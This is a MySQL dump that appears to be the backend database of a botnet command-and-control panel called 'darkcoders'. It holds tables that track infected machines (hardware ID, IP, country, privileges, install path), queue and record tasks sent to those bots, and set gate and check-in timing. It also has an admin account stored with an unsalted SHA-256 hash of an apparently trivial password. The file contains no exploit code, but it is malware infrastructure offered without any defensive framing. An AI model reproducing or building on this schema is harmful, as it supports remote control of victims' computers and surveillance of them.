

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `darkcoders`
--

-- --------------------------------------------------------

--
-- Table structure for table `bots`
--

DROP TABLE IF EXISTS `bots`;
CREATE TABLE IF NOT EXISTS `bots` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `bothwid` varchar(100) NOT NULL,
  `ipaddress` varchar(75) NOT NULL,
  `country` int(5) NOT NULL,
  `installdate` int(50) NOT NULL,
  `lastresponse` int(50) NOT NULL,
  `currenttask` int(255) NOT NULL,
  `operatingsys` varchar(300) NOT NULL,
  `botversion` varchar(30) NOT NULL,
  `privileges` varchar(5) NOT NULL,
  `installationpath` text NOT NULL,
  `computername` text NOT NULL,
  `lastreboot` text NOT NULL,
  `mark` int(1) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `plogs`
--

DROP TABLE IF EXISTS `plogs`;
CREATE TABLE IF NOT EXISTS `plogs` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `ipaddress` varchar(75) NOT NULL,
  `action` text NOT NULL,
  `date` int(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `plogs`
--

INSERT INTO `plogs` (`id`, `username`, `ipaddress`, `action`, `date`) VALUES
(1, 'admin', '::1', 'Logged in', 1519044571),
(2, 'admin', '::1', 'Logged out', 1519044661);

-- --------------------------------------------------------

--
-- Table structure for table `settings`
--

DROP TABLE IF EXISTS `settings`;
CREATE TABLE IF NOT EXISTS `settings` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `knock` int(10) NOT NULL,
  `dead` int(10) NOT NULL,
  `gate_status` int(1) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `settings`
--

INSERT INTO `settings` (`id`, `knock`, `dead`, `gate_status`) VALUES
(1, 5, 7, 1);

-- --------------------------------------------------------

--
-- Table structure for table `tasks`
--

DROP TABLE IF EXISTS `tasks`;
CREATE TABLE IF NOT EXISTS `tasks` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `task` varchar(100) NOT NULL,
  `params` text NOT NULL,
  `filters` text NOT NULL,
  `executions` varchar(100) NOT NULL,
  `username` varchar(50) NOT NULL,
  `status` int(1) NOT NULL,
  `date` int(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `tasks_completed`
--

DROP TABLE IF EXISTS `tasks_completed`;
CREATE TABLE IF NOT EXISTS `tasks_completed` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `bothwid` varchar(100) NOT NULL,
  `taskid` int(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
CREATE TABLE IF NOT EXISTS `users` (
  `id` int(255) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(300) NOT NULL,
  `privileges` varchar(300) NOT NULL,
  `status` int(1) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `username`, `password`, `privileges`, `status`) VALUES
(1, 'admin', '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918', 'admin', 1);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
